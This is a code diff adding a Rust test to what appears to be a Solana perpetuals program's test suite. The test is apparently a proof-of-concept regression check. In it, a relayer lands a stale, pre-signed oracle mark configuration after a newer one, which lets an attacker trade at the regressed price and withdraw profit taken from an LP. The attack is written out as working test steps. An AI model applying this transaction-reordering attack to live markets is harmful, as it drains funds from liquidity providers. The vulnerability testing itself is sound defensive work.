@@ -12981,6 +12981,136 @@ fn v16_bpf_configure_and_push_auth_mark_are_bounded_and_clock_authenticated() {
 }
 
 #[test]
+fn v16_attack_delayed_auth_mark_configuration_cannot_override_newer_intent() {
+    const OPEN_SIZE_Q: i128 = (10_000 * POS_SCALE) as i128;
+    const ATTACKER_DEPOSIT: u128 = 2_000_000;
+    const LP_DEPOSIT: u128 = 4_000_000;
+    const STALE_MARK_PROFIT: u128 = 500_000;
+
+    let mut env = V16CuEnv::new();
+    let attacker = Keypair::new();
+    let lp_owner = Keypair::new();
+    let attacker_account = env.create_portfolio(&attacker);
+    let lp_account = env.create_portfolio(&lp_owner);
+    env.deposit(&attacker, attacker_account, ATTACKER_DEPOSIT);
+    env.deposit(&lp_owner, lp_account, LP_DEPOSIT);
+    let (matcher_program, matcher_context, matcher_delegate) =
+        auth_matcher_for_lp(&mut env, &lp_owner, lp_account);
+
+    // The honest oracle authority signs a low initial configuration, then corrects it before
+    // either transaction lands. A later ordinary observation at the corrected price is also
+    // pre-signed. All three transactions are valid under the same recent blockhash, so an
+    // unprivileged relayer can choose their landing order without possessing the oracle key.
+    env.svm.expire_blockhash();
+    let recent_blockhash = env.svm.latest_blockhash();
+    let signed_mark_instruction = |instruction: ProgInstruction| {
+        let ix = Instruction {
+            program_id: env.program_id,
+            accounts: vec![
+                AccountMeta::new(env.admin.pubkey(), true),
+                AccountMeta::new(env.market, false),
+            ],
+            data: instruction.encode(),
+        };
+        Transaction::new_signed_with_payer(
+            &[heap_ix(), cu_ix(), ix],
+            Some(&env.payer.pubkey()),
+            &[&env.payer, &env.admin],
+            recent_blockhash,
+        )
+    };
+    let delayed_low_config = signed_mark_instruction(ProgInstruction::ConfigureAuthMark {
+        asset_index: 0,
+        now_slot: 0,
+        initial_mark_e6: 50,
+    });
+    let newer_correct_config = signed_mark_instruction(ProgInstruction::ConfigureAuthMark {
+        asset_index: 0,
+        now_slot: 0,
+        initial_mark_e6: 100,
+    });
+    let next_honest_observation = signed_mark_instruction(ProgInstruction::PushAuthMark {
+        asset_index: 0,
+        now_slot: 0,
+        mark_e6: 100,
+    });
+
+    env.svm
+        .send_transaction(newer_correct_config)
+        .expect("newer correcting configuration lands first");
+    assert_eq!(env.market_state().0.mark_ewma_e6, 100);
+    env.svm
+        .send_transaction(delayed_low_config)
+        .expect("pre-fix delayed configuration remains valid");
+    assert_eq!(
+        env.market_state().0.mark_ewma_e6,
+        50,
+        "the delayed older configuration regressed the live mark"
+    );
+
+    env.trade_cpi_with_cu_on_asset(
+        &attacker,
+        attacker_account,
+        &lp_owner,
+        lp_account,
+        matcher_program,
+        matcher_context,
+        matcher_delegate,
+        0,
+        OPEN_SIZE_Q,
+        0,
+    );
+    env.svm
+        .send_transaction(next_honest_observation)
+        .expect("the next honest mark observation lands");
+    env.svm.warp_to_slot(1);
+    for account in [attacker_account, lp_account] {
+        env.svm.expire_blockhash();
+        env.crank(
+            account,
+            ProgInstruction::PermissionlessCrank {
+                now_slot: 1,
+                observations: crank_observations(0),
+            },
+        );
+    }
+    env.svm.expire_blockhash();
+    env.trade_cpi_with_cu_on_asset(
+        &attacker,
+        attacker_account,
+        &lp_owner,
+        lp_account,
+        matcher_program,
+        matcher_context,
+        matcher_delegate,
+        0,
+        -OPEN_SIZE_Q,
+        0,
+    );
+
+    let attacker_state = env.portfolio_state(attacker_account);
+    let lp_state = env.portfolio_state(lp_account);
+    assert_eq!(attacker_state.pnl.get(), STALE_MARK_PROFIT as i128);
+    assert_eq!(lp_state.capital.get(), LP_DEPOSIT - STALE_MARK_PROFIT);
+    env.convert_released_pnl_with_cu(&attacker, attacker_account, STALE_MARK_PROFIT);
+    let attacker_capital = env.portfolio_state(attacker_account).capital.get();
+    let attacker_dest = env.withdraw(&attacker, attacker_account, attacker_capital);
+    let lp_dest = env.withdraw(&lp_owner, lp_account, lp_state.capital.get());
+    assert_eq!(
+        env.token_amount(attacker_dest) as u128,
+        ATTACKER_DEPOSIT + STALE_MARK_PROFIT
+    );
+    assert_eq!(
+        env.token_amount(lp_dest) as u128,
+        LP_DEPOSIT - STALE_MARK_PROFIT
+    );
+    panic!(
+        "delayed AuthMark configuration transferred {STALE_MARK_PROFIT} atoms \
+         from an independent LP"
+    );
+}
+
+#[test]
 fn v16_bpf_auth_mark_target_effective_lag_counts_toward_liquidation_health() {
     const INITIAL_MARK: u64 = 100_000_000;
     const TARGET_MARK: u64 = 90_000_000;
